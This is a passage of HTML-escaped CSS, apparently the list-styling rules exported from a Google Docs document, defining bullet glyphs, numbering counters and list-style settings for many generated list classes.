&quot;}ul.lst-kix_aijgezs7ihwn-7{list-style-type:none}ul.lst-kix_aijgezs7ihwn-8{list-style-type:none}ul.lst-kix_aijgezs7ihwn-1{list-style-type:none}ul.lst-kix_aijgezs7ihwn-2{list-style-type:none}ul.lst-kix_aijgezs7ihwn-3{list-style-type:none}ul.lst-kix_aijgezs7ihwn-4{list-style-type:none}.lst-kix_h5hx08hv18g-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-3,decimal) &quot;. &quot;}.lst-kix_h5hx08hv18g-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-5,lower-roman) &quot;. &quot;}.lst-kix_r3qafwu9amb7-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_aijgezs7ihwn-0{list-style-type:none}ul.lst-kix_r3qafwu9amb7-0{list-style-type:none}ul.lst-kix_r3qafwu9amb7-1{list-style-type:none}.lst-kix_dq55oor2y5qd-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_aijgezs7ihwn-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_r3qafwu9amb7-4{list-style-type:none}ul.lst-kix_r3qafwu9amb7-5{list-style-type:none}.lst-kix_dq55oor2y5qd-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_r3qafwu9amb7-2{list-style-type:none}ul.lst-kix_r3qafwu9amb7-3{list-style-type:none}ul.lst-kix_r3qafwu9amb7-8{list-style-type:none}ul.lst-kix_r3qafwu9amb7-6{list-style-type:none}ul.lst-kix_r3qafwu9amb7-7{list-style-type:none}.lst-kix_aijgezs7ihwn-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pbw7k2omnys5-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pbw7k2omnys5-5,lower-roman) &quot;. &quot;}ol.lst-kix_7gh94rsyg3pc-7.start{counter-reset:lst-ctn-kix_7gh94rsyg3pc-7 0}.lst-kix_yc4eoxp4yku1-3&gt;li{counter-increment:lst-ctn-kix_yc4eoxp4yku1-3}.lst-kix_aijgezs7ihwn-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pkd7hbr03pq1-4&gt;li{counter-increment:lst-ctn-kix_pkd7hbr03pq1-4}ol.lst-kix_2ymhwgkcn4n-0.start{counter-reset:lst-ctn-kix_2ymhwgkcn4n-0 0}.lst-kix_pbw7k2omnys5-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_e3243wulvkb-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vujyyh29dyw5-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pkd7hbr03pq1-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-6,decimal) &quot;. &quot;}ol.lst-kix_yc4eoxp4yku1-6.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-6 0}.lst-kix_pkd7hbr03pq1-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-8,lower-roman) &quot;. &quot;}.lst-kix_e3243wulvkb-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vih28v9vxmim-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pkd7hbr03pq1-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-2,lower-roman) &quot;. &quot;}.lst-kix_sdl0l5x6yq8f-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pkd7hbr03pq1-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pkd7hbr03pq1-5,lower-roman) &quot;. &quot;}.lst-kix_sdl0l5x6yq8f-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_7gh94rsyg3pc-2.start{counter-reset:lst-ctn-kix_7gh94rsyg3pc-2 0}.lst-kix_h5hx08hv18g-3&gt;li{counter-increment:lst-ctn-kix_h5hx08hv18g-3}.lst-kix_sdl0l5x6yq8f-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_ujo5hq8owa7j-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_vih28v9vxmim-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vih28v9vxmim-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_2ymhwgkcn4n-1.start{counter-reset:lst-ctn-kix_2ymhwgkcn4n-1 0}.lst-kix_w35fdwefgib8-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_r3qafwu9amb7-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_w35fdwefgib8-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_t6r6gechao92-0{list-style-type:none}.lst-kix_2ymhwgkcn4n-2&gt;li{counter-increment:lst-ctn-kix_2ymhwgkcn4n-2}ol.lst-kix_h5hx08hv18g-6{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-7{list-style-type:none}ul.lst-kix_t6r6gechao92-3{list-style-type:none}ol.lst-kix_h5hx08hv18g-7{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-6{list-style-type:none}ul.lst-kix_t6r6gechao92-4{list-style-type:none}ol.lst-kix_h5hx08hv18g-8{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-5{list-style-type:none}ul.lst-kix_t6r6gechao92-1{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-4{list-style-type:none}ul.lst-kix_t6r6gechao92-2{list-style-type:none}ul.lst-kix_t6r6gechao92-7{list-style-type:none}ul.lst-kix_t6r6gechao92-8{list-style-type:none}.lst-kix_pbw7k2omnys5-4&gt;li{counter-increment:lst-ctn-kix_pbw7k2omnys5-4}ul.lst-kix_t6r6gechao92-5{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-8{list-style-type:none}ul.lst-kix_t6r6gechao92-6{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-3{list-style-type:none}.lst-kix_w35fdwefgib8-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_b5bnssp5mcj5-2{list-style-type:none}.lst-kix_qd1fllvblyr-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_4dgbyucsgzt8-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_b5bnssp5mcj5-1{list-style-type:none}ul.lst-kix_b5bnssp5mcj5-0{list-style-type:none}.lst-kix_4dgbyucsgzt8-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_60bmaqde728h-5{list-style-type:none}ul.lst-kix_60bmaqde728h-4{list-style-type:none}.lst-kix_jxi7mn5ld7an-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jxi7mn5ld7an-4,lower-latin) &quot;. &quot;}ul.lst-kix_60bmaqde728h-7{list-style-type:none}ul.lst-kix_60bmaqde728h-6{list-style-type:none}ol.lst-kix_7gh94rsyg3pc-3.start{counter-reset:lst-ctn-kix_7gh94rsyg3pc-3 0}ul.lst-kix_60bmaqde728h-1{list-style-type:none}ul.lst-kix_60bmaqde728h-0{list-style-type:none}ul.lst-kix_60bmaqde728h-3{list-style-type:none}ul.lst-kix_60bmaqde728h-2{list-style-type:none}.lst-kix_qd1fllvblyr-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_60bmaqde728h-8{list-style-type:none}.lst-kix_qd1fllvblyr-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4dgbyucsgzt8-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_cnyotsxn6ltg-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jxi7mn5ld7an-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jxi7mn5ld7an-7,lower-latin) &quot;. &quot;}.lst-kix_jxi7mn5ld7an-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jxi7mn5ld7an-8,lower-roman) &quot;. &quot;}.lst-kix_qd1fllvblyr-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_7g0li9r3maw0-4&gt;li{counter-increment:lst-ctn-kix_7g0li9r3maw0-4}.lst-kix_n5ophhflxi4k-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_pipdk6l60rc8-1.start{counter-reset:lst-ctn-kix_pipdk6l60rc8-1 0}.lst-kix_8n3didooap36-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8n3didooap36-4,lower-latin) &quot;. &quot;}.lst-kix_cnyotsxn6ltg-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_7g0li9r3maw0-2.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-2 0}.lst-kix_esouuo5cwagu-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_8n3didooap36-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8n3didooap36-8,lower-roman) &quot;. &quot;}ol.lst-kix_h5hx08hv18g-1{list-style-type:none}.lst-kix_2ymhwgkcn4n-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2ymhwgkcn4n-7,lower-latin) &quot;. &quot;}ol.lst-kix_h5hx08hv18g-2{list-style-type:none}ol.lst-kix_h5hx08hv18g-3{list-style-type:none}ol.lst-kix_h5hx08hv18g-4{list-style-type:none}ol.lst-kix_h5hx08hv18g-5{list-style-type:none}.lst-kix_ldlvyaupc5j0-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pkd7hbr03pq1-2&gt;li{counter-increment:lst-ctn-kix_pkd7hbr03pq1-2}.lst-kix_h5hx08hv18g-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-6,decimal) &quot;. &quot;}.lst-kix_esouuo5cwagu-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ldlvyaupc5j0-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xq6rarus8xqa-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pbw7k2omnys5-6&gt;li{counter-increment:lst-ctn-kix_pbw7k2omnys5-6}ol.lst-kix_7g0li9r3maw0-1.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-1 0}.lst-kix_h5hx08hv18g-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_h5hx08hv18g-2,lower-roman) &quot;. &quot;}.lst-kix_aijgezs7ihwn-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xq6rarus8xqa-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ygp4aypqry7g-4{list-style-type:none}ul.lst-kix_ygp4aypqry7g-3{list-style-type:none}.lst-kix_hyye7g1opk7h-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_2ymhwgkcn4n-5.start{counter-reset:lst-ctn-kix_2ymhwgkcn4n-5 0}ul.lst-kix_ygp4aypqry7g-6{list-style-type:none}ul.lst-kix_ygp4aypqry7g-5{list-style-type:none}ul.lst-kix_ygp4aypqry7g-0{list-style-type:none}ul.lst-kix_ygp4aypqry7g-2{list-style-type:none}.lst-kix_pbw7k2omnys5-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pbw7k2omnys5-2,lower-roman) &quot;. &quot;}ul.lst-kix_ygp4aypqry7g-1{list-style-type:none}ul.lst-kix_ygp4aypqry7g-8{list-style-type:none}.lst-kix_137rha48dom7-2&gt;li{counter-increment:lst-ctn-kix_137rha48dom7-2}ul.lst-kix_ygp4aypqry7g-7{list-style-type:none}ol.lst-kix_7g0li9r3maw0-0.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-0 0}.lst-kix_2ymhwgkcn4n-7&gt;li{counter-increment:lst-ctn-kix_2ymhwgkcn4n-7}.lst-kix_ho9g9u9fgt2w-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ho9g9u9fgt2w-0,decimal) &quot;. &quot;}ul.lst-kix_4vw4podmovup-4{list-style-type:none}ul.lst-kix_4vw4podmovup-5{list-style-type:none}ul.lst-kix_4vw4podmovup-6{list-style-type:none}ul.lst-kix_4vw4podmovup-7{list-style-type:none}ul.lst-kix_4vw4podmovup-0{list-style-type:none}ul.lst-kix_4vw4podmovup-1{list-style-type:none}ul.lst-kix_4vw4podmovup-2{list-style-type:none}.lst-kix_e3243wulvkb-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_4vw4podmovup-3{list-style-type:none}ul.lst-kix_esouuo5cwagu-2{list-style-type:none}ul.lst-kix_esouuo5cwagu-1{list-style-type:none}ul.lst-kix_esouuo5cwagu-4{list-style-type:none}ul.lst-kix_esouuo5cwagu-3{list-style-type:none}ul.lst-kix_4vw4podmovup-8{list-style-type:none}.lst-kix_t31j4fk48hym-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_esouuo5cwagu-0{list-style-type:none}ol.lst-kix_2ymhwgkcn4n-6.start{counter-reset:lst-ctn-kix_2ymhwgkcn4n-6 0}ol.lst-kix_pipdk6l60rc8-2.start{counter-reset:lst-ctn-kix_pipdk6l60rc8-2 0}.lst-kix_jny1y8ia74gu-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_esouuo5cwagu-6{list-style-type:none}ul.lst-kix_esouuo5cwagu-5{list-style-type:none}ul.lst-kix_esouuo5cwagu-8{list-style-type:none}.lst-kix_e3243wulvkb-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_esouuo5cwagu-7{list-style-type:none}ol.lst-kix_yc4eoxp4yku1-5.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-5 0}.lst-kix_kpitf7q25bod-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_i1g4wgt7686h-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_8n3didooap36-7&gt;li{counter-increment:lst-ctn-kix_8n3didooap36-7}.lst-kix_5eiufpectkzt-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_105qlabp070-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kpitf7q25bod-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_i1g4wgt7686h-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_105qlabp070-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dg7blrqr8d63-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kpitf7q25bod-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_105qlabp070-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_5jrz2mxy905c-3&gt;li{counter-increment:lst-ctn-kix_5jrz2mxy905c-3}.lst-kix_ay8c6zydp6wo-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_hyye7g1opk7h-1.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-1 0}.lst-kix_2a1s98goatwb-5&gt;li{counter-increment:lst-ctn-kix_2a1s98goatwb-5}ol.lst-kix_7gh94rsyg3pc-4.start{counter-reset:lst-ctn-kix_7gh94rsyg3pc-4 0}.lst-kix_ay8c6zydp6wo-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_4vw4podmovup-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rdq5wlyhqi2l-4&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-4}.lst-kix_efugpt5gt85e-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_6l72wuovwro5-2&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_rdq5wlyhqi2l-0{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-1{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-2{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-3{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-4{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-5{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-6{list-style-type:none}.lst-kix_tx9oceqag1j0-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_tx9oceqag1j0-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_rdq5wlyhqi2l-7{list-style-type:none}ol.lst-kix_rdq5wlyhqi2l-8{list-style-type:none}ol.lst-kix_hyye7g1opk7h-6.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-6 0}.lst-kix_6l72wuovwro5-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_6l72wuovwro5-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_tx9oceqag1j0-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_2a1s98goatwb-2{list-style-type:none}ol.lst-kix_2a1s98goatwb-1{list-style-type:none}ol.lst-kix_2a1s98goatwb-4{list-style-type:none}ol.lst-kix_2a1s98goatwb-3{list-style-type:none}ol.lst-kix_2a1s98goatwb-6{list-style-type:none}.lst-kix_rdq5wlyhqi2l-1&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-1}ol.lst-kix_2a1s98goatwb-5{list-style-type:none}ol.lst-kix_2a1s98goatwb-8{list-style-type:none}ol.lst-kix_2a1s98goatwb-7{list-style-type:none}ol.lst-kix_hyye7g1opk7h-8.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-8 0}.lst-kix_hyye7g1opk7h-7&gt;li{counter-increment:lst-ctn-kix_hyye7g1opk7h-7}.lst-kix_x1n37nye8y6i-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ldlvyaupc5j0-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_60bmaqde728h-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_hsg7ekf7ji1b-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_60bmaqde728h-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h5hx08hv18g-6&gt;li{counter-increment:lst-ctn-kix_h5hx08hv18g-6}ol.lst-kix_7g0li9r3maw0-5.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-5 0}.lst-kix_tm3swphxsxm3-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_hsg7ekf7ji1b-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_brr67s28swow-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ujo5hq8owa7j-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ho9g9u9fgt2w-4&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-4}.lst-kix_b5bnssp5mcj5-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2a1s98goatwb-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_yc4eoxp4yku1-7.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-7 0}.lst-kix_hyye7g1opk7h-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyye7g1opk7h-3,decimal) &quot;. &quot;}.lst-kix_brr67s28swow-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_dg7blrqr8d63-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_7g0li9r3maw0-7.start{counter-reset:lst-ctn-kix_7g0li9r3maw0-7 0}.lst-kix_qehakqxejyir-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_df19sm7iqier-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_6l72wuovwro5-5{list-style-type:none}ul.lst-kix_6l72wuovwro5-4{list-style-type:none}.lst-kix_82xwcoadaw1l-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_6l72wuovwro5-3{list-style-type:none}ul.lst-kix_6l72wuovwro5-2{list-style-type:none}.lst-kix_2a1s98goatwb-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2a1s98goatwb-6,decimal) &quot;. &quot;}ul.lst-kix_6l72wuovwro5-8{list-style-type:none}ul.lst-kix_6l72wuovwro5-7{list-style-type:none}.lst-kix_jny1y8ia74gu-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_6l72wuovwro5-6{list-style-type:none}ul.lst-kix_6l72wuovwro5-1{list-style-type:none}ul.lst-kix_6l72wuovwro5-0{list-style-type:none}.lst-kix_t31j4fk48hym-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_7gh94rsyg3pc-8{list-style-type:none}.lst-kix_ho9g9u9fgt2w-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ho9g9u9fgt2w-3,decimal) &quot;. &quot;}ol.lst-kix_7gh94rsyg3pc-7{list-style-type:none}ol.lst-kix_7gh94rsyg3pc-6{list-style-type:none}ol.lst-kix_7gh94rsyg3pc-6.start{counter-reset:lst-ctn-kix_7gh94rsyg3pc-6 0}ol.lst-kix_7gh94rsyg3pc-5{list-style-type:none}ol.lst-kix_7gh94rsyg3pc-4{list-style-type:none}ol.lst-kix_7gh94rsyg3pc-3{list-style-type:none}.lst-kix_lnv8dxxow5z5-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rdq5wlyhqi2l-7&gt;li{counter-increment:lst-ctn-kix_rdq5wlyhqi2l-7}.lst-kix_48bktl3sehd-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gpt6d7glhte-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gpt6d7glhte-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_yc4eoxp4yku1-2.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-2 0}.lst-kix_5jrz2mxy905c-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_5jrz2mxy905c-7,lower-latin) &quot;. &quot;}ol.lst-kix_hyye7g1opk7h-4.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-4 0}ol.lst-kix_7gh94rsyg3pc-8.start{counter-reset:lst-ctn-kix_7gh94rsyg3pc-8 0}ul.lst-kix_137rha48dom7-0{list-style-type:none}.lst-kix_rdq5wlyhqi2l-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_rdq5wlyhqi2l-6,decimal) &quot;. &quot;}.lst-kix_sdl0l5x6yq8f-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_7g0li9r3maw0-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_7g0li9r3maw0-0,decimal) &quot;. &quot;}.lst-kix_8n3didooap36-4&gt;li{counter-increment:lst-ctn-kix_8n3didooap36-4}.lst-kix_hyye7g1opk7h-4&gt;li{counter-increment:lst-ctn-kix_hyye7g1opk7h-4}.lst-kix_zf75tum0ttlq-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_jxi7mn5ld7an-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_jxi7mn5ld7an-1,lower-latin) &quot;. &quot;}.lst-kix_23pctkk68nfg-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_ldlvyaupc5j0-8{list-style-type:none}ul.lst-kix_ldlvyaupc5j0-7{list-style-type:none}ul.lst-kix_ldlvyaupc5j0-6{list-style-type:none}ul.lst-kix_ldlvyaupc5j0-5{list-style-type:none}.lst-kix_7gh94rsyg3pc-7&gt;li{counter-increment:lst-ctn-kix_7gh94rsyg3pc-7}ul.lst-kix_ldlvyaupc5j0-4{list-style-type:none}.lst-kix_zf75tum0ttlq-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_yc4eoxp4yku1-3.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-3 0}ul.lst-kix_23pctkk68nfg-6{list-style-type:none}ul.lst-kix_23pctkk68nfg-7{list-style-type:none}ul.lst-kix_23pctkk68nfg-4{list-style-type:none}ul.lst-kix_23pctkk68nfg-5{list-style-type:none}ul.lst-kix_23pctkk68nfg-8{list-style-type:none}.lst-kix_ho9g9u9fgt2w-1&gt;li{counter-increment:lst-ctn-kix_ho9g9u9fgt2w-1}ul.lst-kix_ldlvyaupc5j0-3{list-style-type:none}ul.lst-kix_brr67s28swow-4{list-style-type:none}ul.lst-kix_ldlvyaupc5j0-2{list-style-type:none}ul.lst-kix_brr67s28swow-3{list-style-type:none}ul.lst-kix_ldlvyaupc5j0-1{list-style-type:none}ul.lst-kix_brr67s28swow-6{list-style-type:none}ul.lst-kix_ldlvyaupc5j0-0{list-style-type:none}ul.lst-kix_brr67s28swow-5{list-style-type:none}ul.lst-kix_brr67s28swow-0{list-style-type:none}ul.lst-kix_brr67s28swow-2{list-style-type:none}ul.lst-kix_brr67s28swow-1{list-style-type:none}.lst-kix_2ymhwgkcn4n-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2ymhwgkcn4n-1,lower-latin) &quot;. &quot;}ol.lst-kix_hyye7g1opk7h-2.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-2 0}.lst-kix_clvvz81j6xhb-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_hyye7g1opk7h-5.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-5 0}ul.lst-kix_23pctkk68nfg-2{list-style-type:none}ul.lst-kix_brr67s28swow-8{list-style-type:none}ul.lst-kix_23pctkk68nfg-3{list-style-type:none}ul.lst-kix_brr67s28swow-7{list-style-type:none}ul.lst-kix_23pctkk68nfg-0{list-style-type:none}ul.lst-kix_23pctkk68nfg-1{list-style-type:none}.lst-kix_23pctkk68nfg-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_2a1s98goatwb-2&gt;li{counter-increment:lst-ctn-kix_2a1s98goatwb-2}ul.lst-kix_kpitf7q25bod-0{list-style-type:none}ul.lst-kix_kpitf7q25bod-2{list-style-type:none}ul.lst-kix_kpitf7q25bod-1{list-style-type:none}.lst-kix_hsg7ekf7ji1b-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_kpitf7q25bod-4{list-style-type:none}ul.lst-kix_kpitf7q25bod-3{list-style-type:none}.lst-kix_uuwuesmgh0v-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_kpitf7q25bod-6{list-style-type:none}ul.lst-kix_kpitf7q25bod-5{list-style-type:none}ul.lst-kix_kpitf7q25bod-8{list-style-type:none}ul.lst-kix_kpitf7q25bod-7{list-style-type:none}.lst-kix_60bmaqde728h-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_x1n37nye8y6i-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_r3qafwu9amb7-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_5jrz2mxy905c-6&gt;li{counter-increment:lst-ctn-kix_5jrz2mxy905c-6}ol.lst-kix_yc4eoxp4yku1-1.start{counter-reset:lst-ctn-kix_yc4eoxp4yku1-1 0}.lst-kix_dnl50tn7ajrj-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_brr67s28swow-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_hyye7g1opk7h-3.start{counter-reset:lst-ctn-kix_hyye7g1opk7h-3 0}ul.lst-kix_48bktl3sehd-7{list-style-type:none}ul.lst-kix_48bktl3sehd-8{list-style-type:none}ul.lst-kix_48bktl3sehd-5{list-style-type:none}.lst-kix_lnv8dxxow5z5-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_48bktl3sehd-6{list-style-type:none}ul.lst-kix_48bktl3sehd-3{list-style-type:none}ul.lst-kix_48bktl3sehd-4{list-style-type:none}.lst-kix_t31j4fk48hym-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_48bktl3sehd-1{list-style-type:none}ul.lst-kix_48bktl3sehd-2{list-style-type:none}ol.lst-kix_pkd7hbr03pq1-1{list-style-type:none}ul.lst-kix_48bktl3sehd-0{list-style-type:none}ol.lst-kix_pkd7hbr03pq1-2{list-style-type:none}.lst-kix_pbw7k2omnys5-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_pbw7k2omnys5-8,lower-roman) &quot;. &quot;}ol.lst-kix_pkd7hbr03pq1-3{list-style-type:none}.lst-kix_fdfj2vkv7eng-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dg7blrqr8d63-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_dq55oor2y5qd-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ujo5hq8owa7j-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_hyye7g1opk7h-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyye7g1opk7h-6,decimal) &quot;. &quot;}.lst-kix_df19sm7iqier-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_2a1s98goatwb-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_2a1s98goatwb-3,decimal) &quot;. &quot;}.lst-kix_qehakqxejyir-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_82xwcoadaw1l-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_3l83jjwr6djn-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_pkd7hbr03pq1-4{list-style-type:none}.lst-kix_n5ophhflxi4k-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_pkd7hbr03pq1-5{list-style-type:none}ol.lst-kix_pkd7hbr03pq1-6{list-style-type:none}ol.lst-kix_pkd7hbr03pq1-7{list-style-type:none}.lst-kix_b5bnssp5mcj5-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_pkd7hbr03pq1-8{list-style-type:none}.lst-kix_z3xg0uwuks4l-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ho9g9u9fgt2w-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_ho9g9u9fgt2w-6,decimal) &quot;. 